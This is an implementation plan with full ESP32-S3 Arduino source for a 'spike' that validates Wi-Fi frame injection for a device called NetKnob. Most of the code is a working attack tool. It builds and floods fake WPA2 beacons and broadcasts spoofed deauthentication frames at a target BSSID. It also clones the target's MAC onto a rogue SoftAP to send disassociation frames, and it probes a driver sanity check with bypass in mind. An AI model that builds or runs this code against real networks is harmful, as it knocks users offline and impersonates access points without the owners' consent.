# Spike Validation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an isolated test sketch that validates ESP32-S3 WiFi TX capabilities (beacon injection, TX+RX coexistence, deauth delivery, memory stability) before Phase 3 implementation begins.

**Architecture:** Single-file Arduino sketch (`spike/main.cpp`) with a serial menu. Each of the four tests is a standalone function. Results stored in a struct array and printed as a summary table. No dependencies on the main NetKnob `src/` codebase.

**Tech Stack:** Arduino framework on ESP-IDF, `esp_wifi_80211_tx()`, promiscuous mode API, ESP32-S3 SoftAP. No LVGL, NimBLE, or external libraries.

---

## File Map

| File | Purpose |
|------|---------|
| Create: `spike/platformio.ini` | Standalone PlatformIO config for the spike |
| Create: `spike/src/main.cpp` | All spike code — menu, tests, frame crafting |
| Create: `spike/README.md` | Brief instructions for running the spike |

No test files — this IS the test. Verification is manual (serial output + phone WiFi list + target device observation).

---

### Task 1: Project Scaffold

**Files:**
- Create: `spike/platformio.ini`
- Create: `spike/src/main.cpp` (skeleton only)

- [ ] **Step 1: Create `spike/platformio.ini`**

```ini
[env:spike]
platform = espressif32@6.6.0
board = esp32-s3-devkitc-1
framework = arduino
board_build.flash_mode = qio
board_build.flash_size = 16MB
board_build.psram_type = opi
board_build.arduino.memory_type = qio_opi
board_upload.flash_size = 16MB
board_upload.maximum_size = 16777216
upload_port = COM9
monitor_port = COM9
monitor_speed = 115200
build_flags =
    -DBOARD_HAS_PSRAM
    -DARDUINO_USB_CDC_ON_BOOT=1
    -DARDUINO_USB_MODE=1
```

- [ ] **Step 2: Create `spike/src/main.cpp` with config, types, and empty `setup()`/`loop()`**

```cpp
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <string.h>

// =========================================================================
// SPIKE CONFIG
// =========================================================================
#define SPIKE_CHANNEL          6
#define SPIKE_BEACON_COUNT     20
#define SPIKE_BEACON_DURATION  15000    // ms — test 1 display window
#define SPIKE_COEXIST_DURATION 10000    // ms — test 2 TX+RX window
#define SPIKE_DEAUTH_COUNT     50       // frames per deauth method
#define SPIKE_DEAUTH_DURATION  5000     // ms — per deauth sub-test
#define SPIKE_MEM_TX_COUNT     1000     // frames for memory test
#define SPIKE_MEM_ROUNDS       3        // repeat memory test N times

// ---- DEAUTH TARGET (edit before test 3) ----
static const uint8_t TARGET_BSSID[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
#define TARGET_CHANNEL         6

// =========================================================================
// SSID WORDLIST (from FSD)
// =========================================================================
static const char* SSID_LIST[SPIKE_BEACON_COUNT] = {
    "Free WiFi",
    "FBI Surveillance Van",
    "Pretty Fly for a Wi-Fi",
    "Drop It Like Its Hotspot",
    "The LAN Before Time",
    "Wu-Tang LAN",
    "Router I Hardly Know Her",
    "Bill Wi the Science Fi",
    "LAN Solo",
    "The Promised LAN",
    "Nacho WiFi",
    "Get Off My LAN",
    "It Burns When IP",
    "No More Mr Wi-Fi",
    "Silence of the LANs",
    "Loading...",
    "Searching...",
    "Connecting...",
    "Not Your WiFi",
    "Virus Detected"
};

// =========================================================================
// RESULT TRACKING
// =========================================================================
enum TestResultCode {
    RESULT_NOT_RUN,
    RESULT_PASS,
    RESULT_FAIL,
    RESULT_INCONCLUSIVE,
    RESULT_NOT_AVAILABLE
};

struct SpikeResult {
    TestResultCode  result;
    char            details[64];
};

// 6 result slots: [0]=beacon TX, [1]=TX+RX, [2]=deauth direct, [3]=deauth rogue AP, [4]=deauth WSL, [5]=memory
#define RESULT_BEACON_TX      0
#define RESULT_TXRX_COEXIST   1
#define RESULT_DEAUTH_DIRECT  2
#define RESULT_DEAUTH_ROGUE   3
#define RESULT_DEAUTH_WSL     4
#define RESULT_MEMORY         5
#define RESULT_COUNT          6

static SpikeResult results[RESULT_COUNT];

// =========================================================================
// FORWARD DECLARATIONS
// =========================================================================
static void print_menu();
static void print_results();
static void wifi_init_sta();
static void run_test_1_beacon_tx();
static void run_test_2_txrx_coexist();
static void run_test_3_deauth();
static void run_test_4_memory();
static void run_all();

void setup() {
    Serial.begin(115200);
    delay(2000);  // wait for serial monitor

    // Init results
    for (int i = 0; i < RESULT_COUNT; i++) {
        results[i].result = RESULT_NOT_RUN;
        snprintf(results[i].details, sizeof(results[i].details), "—");
    }

    wifi_init_sta();
    print_menu();
}

void loop() {
    if (Serial.available()) {
        char c = Serial.read();
        switch (c) {
            case '1': run_test_1_beacon_tx();   print_menu(); break;
            case '2': run_test_2_txrx_coexist(); print_menu(); break;
            case '3': run_test_3_deauth();       print_menu(); break;
            case '4': run_test_4_memory();       print_menu(); break;
            case '5': run_all();                 print_menu(); break;
            case 'r': case 'R': print_results(); print_menu(); break;
            default: break;
        }
    }
}
```

- [ ] **Step 3: Verify it compiles**

Open a terminal in the `spike/` directory and run:
```
pio run
```
Expected: builds successfully with no errors (functions are declared but not yet defined — add empty stubs to make it compile):

Add these stubs at the bottom of `main.cpp` for now:
```cpp
static void print_menu() {
    Serial.println();
    Serial.println("=================================");
    Serial.println("  NetKnob Phase 3 - Spike Validation");
    Serial.println("=================================");
    Serial.println("  [1] Beacon TX");
    Serial.println("  [2] TX+RX Coexistence");
    Serial.println("  [3] Deauth Methods");
    Serial.println("  [4] Memory Stability");
    Serial.println("  [5] Run All");
    Serial.println("  [R] Print results summary");
    Serial.println("=================================");
    Serial.print("> ");
}

static void print_results() {
    Serial.println("[results stub]");
}

static void wifi_init_sta() {
    Serial.println("[wifi init stub]");
}

static void run_test_1_beacon_tx() {
    Serial.println("[test 1 stub]");
}

static void run_test_2_txrx_coexist() {
    Serial.println("[test 2 stub]");
}

static void run_test_3_deauth() {
    Serial.println("[test 3 stub]");
}

static void run_test_4_memory() {
    Serial.println("[test 4 stub]");
}

static void run_all() {
    Serial.println("[run all stub]");
}
```

- [ ] **Step 4: Commit scaffold**

```bash
git add spike/
git commit -m "spike: scaffold for Phase 3 TX validation"
```

---

### Task 2: WiFi Init + Results Table + Menu

**Files:**
- Modify: `spike/src/main.cpp`

- [ ] **Step 1: Implement `wifi_init_sta()`**

Replace the `wifi_init_sta` stub with:

```cpp
static void wifi_init_sta() {
    Serial.println("[WiFi] Initializing STA + promiscuous mode...");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(SPIKE_CHANNEL, WIFI_SECOND_CHAN_NONE);

    Serial.printf("[WiFi] Channel: %d\n", SPIKE_CHANNEL);
    Serial.printf("[WiFi] Free heap: %u bytes\n", esp_get_free_heap_size());
    Serial.println("[WiFi] Ready.");
}
```

- [ ] **Step 2: Implement `print_results()`**

Replace the `print_results` stub with:

```cpp
static const char* result_str(TestResultCode r) {
    switch (r) {
        case RESULT_PASS:          return "PASS ";
        case RESULT_FAIL:          return "FAIL ";
        case RESULT_INCONCLUSIVE:  return "INCON";
        case RESULT_NOT_AVAILABLE: return "N/A  ";
        default:                   return " --  ";
    }
}

static void print_results() {
    Serial.println();
    Serial.println("====================================================");
    Serial.println("  TEST                  | RESULT | DETAILS");
    Serial.println("----------------------------------------------------");

    const char* names[RESULT_COUNT] = {
        "1.  Beacon TX          ",
        "2.  TX+RX Coexistence  ",
        "3a. Deauth: Direct     ",
        "3b. Deauth: Rogue AP   ",
        "3c. Deauth: WSL patch  ",
        "4.  Memory Stability   "
    };

    for (int i = 0; i < RESULT_COUNT; i++) {
        Serial.printf("  %s| %s | %s\n",
            names[i], result_str(results[i].result), results[i].details);
    }

    Serial.println("====================================================");
}
```

- [ ] **Step 3: Implement `run_all()`**

Replace the `run_all` stub with:

```cpp
static void run_all() {
    Serial.println("\n>>> Running all tests sequentially <<<\n");
    run_test_1_beacon_tx();
    delay(3000);
    run_test_2_txrx_coexist();
    delay(3000);
    run_test_3_deauth();
    delay(3000);
    run_test_4_memory();
    Serial.println("\n>>> All tests complete <<<\n");
    print_results();
}
```

- [ ] **Step 4: Flash and verify menu + WiFi init**

```
pio run -t upload && pio device monitor
```

Expected: serial shows WiFi init message, free heap, menu prints. Typing `R` shows the results table with all `--` entries.

- [ ] **Step 5: Commit**

```bash
git add spike/src/main.cpp
git commit -m "spike: WiFi init, results table, run-all sequencer"
```

---

### Task 3: Beacon Frame Crafting + Test 1

**Files:**
- Modify: `spike/src/main.cpp`

- [ ] **Step 1: Add beacon frame builder function**

Add above the test functions:

```cpp
// =========================================================================
// BEACON FRAME CRAFTING
// =========================================================================

// Pre-built beacon frame storage
struct BeaconFrame {
    uint8_t  data[128];
    uint8_t  len;
    uint8_t  seq_offset;   // byte offset of sequence control field
    uint16_t seq_num;      // current sequence number
};

static BeaconFrame beacon_frames[SPIKE_BEACON_COUNT];

// Random MAC: set locally-administered bit (bit 1 of byte 0), clear multicast (bit 0)
static void random_mac(uint8_t mac[6]) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
    mac[0] = (mac[0] | 0x02) & 0xFE;  // locally administered, unicast
}

// Build a single beacon frame for the given SSID and channel
static void build_beacon(BeaconFrame* bf, const char* ssid, uint8_t channel, const uint8_t bssid[6]) {
    uint8_t* f = bf->data;
    uint8_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    uint8_t pos = 0;

    // --- MAC header (24 bytes) ---
    f[pos++] = 0x80; f[pos++] = 0x00;           // Frame control: beacon
    f[pos++] = 0x00; f[pos++] = 0x00;           // Duration
    // Destination: broadcast
    memset(&f[pos], 0xFF, 6); pos += 6;
    // Source: BSSID
    memcpy(&f[pos], bssid, 6); pos += 6;
    // BSSID
    memcpy(&f[pos], bssid, 6); pos += 6;
    // Sequence control
    bf->seq_offset = pos;
    f[pos++] = 0x00; f[pos++] = 0x00;

    // --- Beacon body (12 bytes fixed) ---
    // Timestamp (8 bytes) — fake
    memset(&f[pos], 0, 8); pos += 8;
    // Beacon interval: 100 TU (0x0064)
    f[pos++] = 0x64; f[pos++] = 0x00;
    // Capability info: ESS + privacy (WPA2 appearance)
    f[pos++] = 0x31; f[pos++] = 0x04;

    // --- Tagged parameters ---

    // Tag 0: SSID
    f[pos++] = 0x00;       // tag ID
    f[pos++] = ssid_len;   // tag length
    memcpy(&f[pos], ssid, ssid_len); pos += ssid_len;

    // Tag 1: Supported Rates (8 rates — standard 802.11b/g)
    f[pos++] = 0x01;  // tag ID
    f[pos++] = 0x08;  // tag length
    f[pos++] = 0x82;  // 1 Mbps (basic)
    f[pos++] = 0x84;  // 2 Mbps (basic)
    f[pos++] = 0x8B;  // 5.5 Mbps (basic)
    f[pos++] = 0x96;  // 11 Mbps (basic)
    f[pos++] = 0x24;  // 18 Mbps
    f[pos++] = 0x30;  // 24 Mbps
    f[pos++] = 0x48;  // 36 Mbps
    f[pos++] = 0x6C;  // 54 Mbps

    // Tag 3: DS Parameter Set (channel)
    f[pos++] = 0x03;  // tag ID
    f[pos++] = 0x01;  // tag length
    f[pos++] = channel;

    // Tag 48: RSN IE (WPA2-PSK appearance)
    f[pos++] = 0x30;  // tag ID
    f[pos++] = 0x14;  // tag length (20 bytes)
    // RSN version
    f[pos++] = 0x01; f[pos++] = 0x00;
    // Group cipher: AES (00:0F:AC:04)
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x04;
    // Pairwise cipher count: 1
    f[pos++] = 0x01; f[pos++] = 0x00;
    // Pairwise cipher: AES (00:0F:AC:04)
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x04;
    // AKM count: 1
    f[pos++] = 0x01; f[pos++] = 0x00;
    // AKM: PSK (00:0F:AC:02)
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x02;
    // RSN capabilities
    f[pos++] = 0x00; f[pos++] = 0x00;

    bf->len = pos;
    bf->seq_num = 0;
}

// Increment sequence number in the frame before sending
static void beacon_next_seq(BeaconFrame* bf) {
    bf->seq_num++;
    // Sequence control: seq_num in bits 4-15, fragment 0 in bits 0-3
    uint16_t sc = (bf->seq_num << 4) & 0xFFF0;
    bf->data[bf->seq_offset]     = sc & 0xFF;
    bf->data[bf->seq_offset + 1] = (sc >> 8) & 0xFF;
}
```

- [ ] **Step 2: Implement test 1 — Beacon TX**

Replace the `run_test_1_beacon_tx` stub with:

```cpp
static void run_test_1_beacon_tx() {
    Serial.println("\n========== TEST 1: Beacon TX ==========");
    Serial.println("Sending 20 fake beacons for 15 seconds.");
    Serial.println(">> Check your phone WiFi list for fake SSIDs <<");
    Serial.println("Starting in 3s...");
    delay(3000);

    // Build beacon frames with unique BSSIDs
    uint8_t bssid[6];
    for (int i = 0; i < SPIKE_BEACON_COUNT; i++) {
        random_mac(bssid);
        build_beacon(&beacon_frames[i], SSID_LIST[i], SPIKE_CHANNEL, bssid);
    }

    uint32_t tx_ok = 0;
    uint32_t tx_err = 0;
    esp_err_t last_err = ESP_OK;

    uint32_t start = millis();
    while (millis() - start < SPIKE_BEACON_DURATION) {
        for (int i = 0; i < SPIKE_BEACON_COUNT; i++) {
            beacon_next_seq(&beacon_frames[i]);
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, beacon_frames[i].data, beacon_frames[i].len, false);
            if (err == ESP_OK) {
                tx_ok++;
            } else {
                tx_err++;
                last_err = err;
            }
        }
        delay(100);  // ~10 bursts/sec × 20 SSIDs = ~200 frames/sec
    }

    Serial.printf("TX OK: %u  |  TX errors: %u\n", tx_ok, tx_err);

    if (tx_err == 0) {
        results[RESULT_BEACON_TX].result = RESULT_PASS;
        snprintf(results[RESULT_BEACON_TX].details, 64, "%u frames sent, 0 errors", tx_ok);
    } else {
        results[RESULT_BEACON_TX].result = RESULT_FAIL;
        snprintf(results[RESULT_BEACON_TX].details, 64, "%u OK, %u err (last: 0x%X)", tx_ok, tx_err, last_err);
    }

    Serial.printf(">> Result: %s — %s\n",
        result_str(results[RESULT_BEACON_TX].result),
        results[RESULT_BEACON_TX].details);
}
```

- [ ] **Step 3: Flash and run test 1**

```
pio run -t upload && pio device monitor
```

Type `1`. Expected:
- Serial shows "Starting in 3s..."
- Then frame count updates
- Check phone WiFi list — fake SSIDs should appear
- Serial prints PASS/FAIL with frame count

- [ ] **Step 4: Commit**

```bash
git add spike/src/main.cpp
git commit -m "spike: test 1 — beacon TX with 20 fake SSIDs"
```

---

### Task 4: Test 2 — TX+RX Coexistence

**Files:**
- Modify: `spike/src/main.cpp`

- [ ] **Step 1: Add atomic RX counter and promiscuous callback**

Add near the top of the file, after the `#include` lines:

```cpp
#include <stdatomic.h>

// =========================================================================
// RX COUNTER (for TX+RX coexistence test)
// =========================================================================
static volatile uint32_t rx_frame_count = 0;

static void IRAM_ATTR spike_promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MGMT) {
        rx_frame_count++;
    }
}
```

- [ ] **Step 2: Register the callback in `wifi_init_sta()`**

Add after the `esp_wifi_set_promiscuous(true);` line in `wifi_init_sta()`:

```cpp
    esp_wifi_set_promiscuous_rx_cb(spike_promisc_cb);
```

- [ ] **Step 3: Implement test 2**

Replace the `run_test_2_txrx_coexist` stub with:

```cpp
static void run_test_2_txrx_coexist() {
    Serial.println("\n========== TEST 2: TX+RX Coexistence ==========");
    Serial.println("Sending beacons while counting RX management frames.");
    Serial.println("Starting in 3s...");
    delay(3000);

    // Build beacon frames if not already built (may run test 2 standalone)
    uint8_t bssid[6];
    for (int i = 0; i < SPIKE_BEACON_COUNT; i++) {
        random_mac(bssid);
        build_beacon(&beacon_frames[i], SSID_LIST[i], SPIKE_CHANNEL, bssid);
    }

    // Record baseline RX count
    uint32_t rx_before = rx_frame_count;
    uint32_t tx_count = 0;

    uint32_t start = millis();
    while (millis() - start < SPIKE_COEXIST_DURATION) {
        for (int i = 0; i < SPIKE_BEACON_COUNT; i++) {
            beacon_next_seq(&beacon_frames[i]);
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, beacon_frames[i].data, beacon_frames[i].len, false);
            if (err == ESP_OK) tx_count++;
        }
        delay(50);  // ~20 bursts/sec = ~400 frames/sec TX
    }

    uint32_t rx_after = rx_frame_count;
    uint32_t rx_delta = rx_after - rx_before;
    float rx_rate = (float)rx_delta / (SPIKE_COEXIST_DURATION / 1000.0f);

    Serial.printf("TX sent: %u\n", tx_count);
    Serial.printf("RX during TX: %u (%.1f frames/sec)\n", rx_delta, rx_rate);

    if (rx_delta > 0) {
        results[RESULT_TXRX_COEXIST].result = RESULT_PASS;
        snprintf(results[RESULT_TXRX_COEXIST].details, 64,
            "%u RX during %u TX (%.0f RX/s)", rx_delta, tx_count, rx_rate);
    } else {
        results[RESULT_TXRX_COEXIST].result = RESULT_FAIL;
        snprintf(results[RESULT_TXRX_COEXIST].details, 64,
            "0 RX callbacks during %u TX", tx_count);
    }

    Serial.printf(">> Result: %s — %s\n",
        result_str(results[RESULT_TXRX_COEXIST].result),
        results[RESULT_TXRX_COEXIST].details);
}
```

- [ ] **Step 4: Flash and run test 2**

```
pio run -t upload && pio device monitor
```

Type `2`. Expected:
- TX count > 0 (beacons sent)
- RX delta > 0 (promiscuous callbacks fired during TX)
- PASS if both true

- [ ] **Step 5: Commit**

```bash
git add spike/src/main.cpp
git commit -m "spike: test 2 — TX+RX coexistence verification"
```

---

### Task 5: Test 3 — Deauth Methods (three sub-tests)

**Files:**
- Modify: `spike/src/main.cpp`

- [ ] **Step 1: Add deauth and disassoc frame builders**

Add after the beacon frame functions:

```cpp
// =========================================================================
// DEAUTH / DISASSOC FRAME CRAFTING
// =========================================================================

// Build a deauth frame (26 bytes)
// dest: target (broadcast or specific client)
// src: spoofed to target AP BSSID
// reason: 802.11 reason code
static uint8_t deauth_frame[26];

static void build_deauth(const uint8_t dest[6], const uint8_t src_bssid[6], uint8_t reason) {
    uint8_t* f = deauth_frame;
    f[0] = 0xC0; f[1] = 0x00;           // Frame control: deauth
    f[2] = 0x00; f[3] = 0x00;           // Duration
    memcpy(&f[4], dest, 6);             // Destination
    memcpy(&f[10], src_bssid, 6);       // Source (spoofed)
    memcpy(&f[16], src_bssid, 6);       // BSSID
    f[22] = 0x00; f[23] = 0x00;         // Sequence control
    f[24] = reason; f[25] = 0x00;       // Reason code (little-endian)
}

// Build a disassociation frame (26 bytes) — same structure, different subtype
static uint8_t disassoc_frame[26];

static void build_disassoc(const uint8_t dest[6], const uint8_t src_bssid[6], uint8_t reason) {
    uint8_t* f = disassoc_frame;
    f[0] = 0xA0; f[1] = 0x00;           // Frame control: disassoc
    f[2] = 0x00; f[3] = 0x00;           // Duration
    memcpy(&f[4], dest, 6);             // Destination
    memcpy(&f[10], src_bssid, 6);       // Source (spoofed)
    memcpy(&f[16], src_bssid, 6);       // BSSID
    f[22] = 0x00; f[23] = 0x00;         // Sequence control
    f[24] = reason; f[25] = 0x00;       // Reason code
}
```

- [ ] **Step 2: Implement test 3a — Direct injection**

```cpp
static void run_test_3a_direct() {
    Serial.println("\n--- Test 3a: Direct Deauth Injection ---");

    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    build_deauth(broadcast, TARGET_BSSID, 7);  // reason 7: Class 3

    // Make sure we're on the target channel
    esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
    delay(100);

    uint32_t tx_ok = 0;
    uint32_t tx_err = 0;
    esp_err_t last_err = ESP_OK;

    uint32_t start = millis();
    uint32_t interval_ms = SPIKE_DEAUTH_DURATION / SPIKE_DEAUTH_COUNT;
    if (interval_ms < 10) interval_ms = 10;

    for (int i = 0; i < SPIKE_DEAUTH_COUNT; i++) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        if (err == ESP_OK) {
            tx_ok++;
        } else {
            tx_err++;
            last_err = err;
        }
        delay(interval_ms);
    }

    Serial.printf("Direct: TX OK: %u  |  TX errors: %u\n", tx_ok, tx_err);

    if (tx_err == 0 && tx_ok > 0) {
        results[RESULT_DEAUTH_DIRECT].result = RESULT_PASS;
        snprintf(results[RESULT_DEAUTH_DIRECT].details, 64,
            "%u frames sent (verify target disconnected)", tx_ok);
    } else if (tx_ok > 0) {
        results[RESULT_DEAUTH_DIRECT].result = RESULT_INCONCLUSIVE;
        snprintf(results[RESULT_DEAUTH_DIRECT].details, 64,
            "%u OK, %u err (0x%X)", tx_ok, tx_err, last_err);
    } else {
        results[RESULT_DEAUTH_DIRECT].result = RESULT_FAIL;
        snprintf(results[RESULT_DEAUTH_DIRECT].details, 64,
            "blocked by driver (0x%X)", last_err);
    }

    Serial.printf(">> 3a Result: %s — %s\n",
        result_str(results[RESULT_DEAUTH_DIRECT].result),
        results[RESULT_DEAUTH_DIRECT].details);
}
```

- [ ] **Step 3: Implement test 3b — Rogue AP**

```cpp
static void run_test_3b_rogue_ap() {
    Serial.println("\n--- Test 3b: Rogue AP Deauth ---");

    // Step 1: Switch to APSTA mode
    Serial.println("  Switching to APSTA mode...");
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_AP_STA);
    delay(500);

    // Step 2: Clone target BSSID onto AP interface
    Serial.println("  Spoofing AP MAC to target BSSID...");
    esp_err_t mac_err = esp_wifi_set_mac(WIFI_IF_AP, TARGET_BSSID);
    Serial.printf("  esp_wifi_set_mac: 0x%X\n", mac_err);

    // Step 3: Start SoftAP on target channel
    WiFi.softAP("RogueSpike", nullptr, TARGET_CHANNEL, 0, 1);
    delay(500);

    // Verify the MAC was applied
    uint8_t ap_mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
    Serial.printf("  AP MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
        ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);

    bool mac_match = (memcmp(ap_mac, TARGET_BSSID, 6) == 0);
    Serial.printf("  MAC spoof %s\n", mac_match ? "SUCCESS" : "FAILED");

    // Step 4: Re-enable promiscuous on STA interface and send disassoc frames
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(spike_promisc_cb);
    esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
    delay(100);

    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    build_disassoc(broadcast, TARGET_BSSID, 8);  // reason 8: leaving BSS

    uint32_t tx_ok = 0;
    uint32_t tx_err = 0;
    esp_err_t last_err = ESP_OK;

    uint32_t interval_ms = SPIKE_DEAUTH_DURATION / SPIKE_DEAUTH_COUNT;
    if (interval_ms < 10) interval_ms = 10;

    for (int i = 0; i < SPIKE_DEAUTH_COUNT; i++) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
        if (err == ESP_OK) {
            tx_ok++;
        } else {
            tx_err++;
            last_err = err;
        }
        delay(interval_ms);
    }

    Serial.printf("Rogue AP: TX OK: %u  |  TX errors: %u\n", tx_ok, tx_err);

    // Step 5: Tear down SoftAP, return to STA-only
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(spike_promisc_cb);
    esp_wifi_set_channel(SPIKE_CHANNEL, WIFI_SECOND_CHAN_NONE);
    delay(500);

    if (mac_match && tx_ok > 0 && tx_err == 0) {
        results[RESULT_DEAUTH_ROGUE].result = RESULT_PASS;
        snprintf(results[RESULT_DEAUTH_ROGUE].details, 64,
            "MAC spoofed, %u disassoc sent", tx_ok);
    } else if (!mac_match) {
        results[RESULT_DEAUTH_ROGUE].result = RESULT_FAIL;
        snprintf(results[RESULT_DEAUTH_ROGUE].details, 64,
            "MAC spoof failed (0x%X)", mac_err);
    } else {
        results[RESULT_DEAUTH_ROGUE].result = RESULT_INCONCLUSIVE;
        snprintf(results[RESULT_DEAUTH_ROGUE].details, 64,
            "%u OK, %u err (0x%X)", tx_ok, tx_err, last_err);
    }

    Serial.printf(">> 3b Result: %s — %s\n",
        result_str(results[RESULT_DEAUTH_ROGUE].result),
        results[RESULT_DEAUTH_ROGUE].details);
}
```

- [ ] **Step 4: Implement test 3c — WSL / libnet80211 patch**

```cpp
// Attempt to find the internal sanity check function
// This is a weak symbol — if it doesn't exist, the linker provides our no-op
extern "C" __attribute__((weak)) int ieee80211_raw_frame_sanity_check(int32_t arg0, int32_t arg1, int32_t arg2) {
    // If this weak definition is called, the real function was NOT found
    return -1;  // sentinel: not available
}

static void run_test_3c_wsl() {
    Serial.println("\n--- Test 3c: WSL / libnet80211 Patch ---");

    // Test if the real function exists by calling our weak symbol
    // If we get -1, our stub ran (function not available)
    // If we get something else, the real function exists and we could try to bypass it
    int probe = ieee80211_raw_frame_sanity_check(0, 0, 0);

    if (probe == -1) {
        Serial.println("  ieee80211_raw_frame_sanity_check: NOT FOUND (weak stub called)");
        results[RESULT_DEAUTH_WSL].result = RESULT_NOT_AVAILABLE;
        snprintf(results[RESULT_DEAUTH_WSL].details, 64, "function not linked on S3");
    } else {
        Serial.printf("  ieee80211_raw_frame_sanity_check: FOUND (returned %d)\n", probe);
        Serial.println("  Bypass would be possible — not implemented in spike");
        results[RESULT_DEAUTH_WSL].result = RESULT_INCONCLUSIVE;
        snprintf(results[RESULT_DEAUTH_WSL].details, 64,
            "function found (ret=%d), bypass not tested", probe);
    }

    Serial.printf(">> 3c Result: %s — %s\n",
        result_str(results[RESULT_DEAUTH_WSL].result),
        results[RESULT_DEAUTH_WSL].details);
}
```

- [ ] **Step 5: Wire up `run_test_3_deauth()` to call all three sub-tests**

Replace the `run_test_3_deauth` stub with:

```cpp
static void run_test_3_deauth() {
    Serial.println("\n========== TEST 3: Deauth Methods ==========");
    Serial.printf("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
        TARGET_BSSID[0], TARGET_BSSID[1], TARGET_BSSID[2],
        TARGET_BSSID[3], TARGET_BSSID[4], TARGET_BSSID[5]);
    Serial.printf("Target channel: %d\n", TARGET_CHANNEL);
    Serial.println("Starting in 3s...");
    delay(3000);

    run_test_3a_direct();
    delay(2000);
    run_test_3b_rogue_ap();
    delay(2000);
    run_test_3c_wsl();

    Serial.println("\n--- Deauth Summary ---");
    Serial.printf("  Direct injection: %s\n", result_str(results[RESULT_DEAUTH_DIRECT].result));
    Serial.printf("  Rogue AP:         %s\n", result_str(results[RESULT_DEAUTH_ROGUE].result));
    Serial.printf("  WSL patch:        %s\n", result_str(results[RESULT_DEAUTH_WSL].result));
}
```

- [ ] **Step 6: Flash and run test 3**

```
pio run -t upload && pio device monitor
```

Type `3`. **Before running:** edit `TARGET_BSSID` and `TARGET_CHANNEL` to match your router, then reflash.

Expected:
- 3a: sends deauth frames — check if target device disconnects
- 3b: SoftAP starts with spoofed MAC, sends disassoc — check target
- 3c: likely reports NOT AVAILABLE on S3

- [ ] **Step 7: Commit**

```bash
git add spike/src/main.cpp
git commit -m "spike: test 3 — deauth methods (direct, rogue AP, WSL)"
```

---

### Task 6: Test 4 — Memory Stability

**Files:**
- Modify: `spike/src/main.cpp`

- [ ] **Step 1: Implement test 4**

Replace the `run_test_4_memory` stub with:

```cpp
static void run_test_4_memory() {
    Serial.println("\n========== TEST 4: Memory Stability ==========");
    Serial.printf("Sending %d beacon frames x %d rounds, measuring heap drift.\n",
        SPIKE_MEM_TX_COUNT, SPIKE_MEM_ROUNDS);
    Serial.println("Starting in 3s...");
    delay(3000);

    // Build a single beacon frame for this test
    uint8_t bssid[6];
    random_mac(bssid);
    BeaconFrame mem_beacon;
    build_beacon(&mem_beacon, "MemTest", SPIKE_CHANNEL, bssid);

    int32_t max_drift = 0;
    bool all_pass = true;

    for (int round = 0; round < SPIKE_MEM_ROUNDS; round++) {
        uint32_t heap_before = esp_get_free_heap_size();

        for (int i = 0; i < SPIKE_MEM_TX_COUNT; i++) {
            beacon_next_seq(&mem_beacon);
            esp_wifi_80211_tx(WIFI_IF_STA, mem_beacon.data, mem_beacon.len, false);
            // No delay — fast loop, stress test
        }

        // Small pause to let any deferred frees settle
        delay(100);

        uint32_t heap_after = esp_get_free_heap_size();
        int32_t drift = (int32_t)heap_before - (int32_t)heap_after;

        Serial.printf("  Round %d: before=%u  after=%u  drift=%d bytes\n",
            round + 1, heap_before, heap_after, drift);

        if (abs(drift) > max_drift) max_drift = abs(drift);
        if (abs(drift) >= 1024) all_pass = false;
    }

    Serial.printf("Max drift: %d bytes (threshold: 1024)\n", max_drift);

    if (all_pass) {
        results[RESULT_MEMORY].result = RESULT_PASS;
        snprintf(results[RESULT_MEMORY].details, 64,
            "max drift: %d bytes (%dx%d frames)",
            max_drift, SPIKE_MEM_ROUNDS, SPIKE_MEM_TX_COUNT);
    } else {
        results[RESULT_MEMORY].result = RESULT_FAIL;
        snprintf(results[RESULT_MEMORY].details, 64,
            "LEAK: max drift %d bytes (>1KB)", max_drift);
    }

    Serial.printf(">> Result: %s — %s\n",
        result_str(results[RESULT_MEMORY].result),
        results[RESULT_MEMORY].details);
}
```

- [ ] **Step 2: Flash and run test 4**

```
pio run -t upload && pio device monitor
```

Type `4`. Expected:
- Three rounds of 1000 TX frames each
- Heap drift per round printed
- PASS if all rounds < 1 KB drift

- [ ] **Step 3: Commit**

```bash
git add spike/src/main.cpp
git commit -m "spike: test 4 — memory stability under TX load"
```

---

### Task 7: README + Final Run

**Files:**
- Create: `spike/README.md`

- [ ] **Step 1: Create `spike/README.md`**

```markdown
# NetKnob Phase 3 — Spike Validation

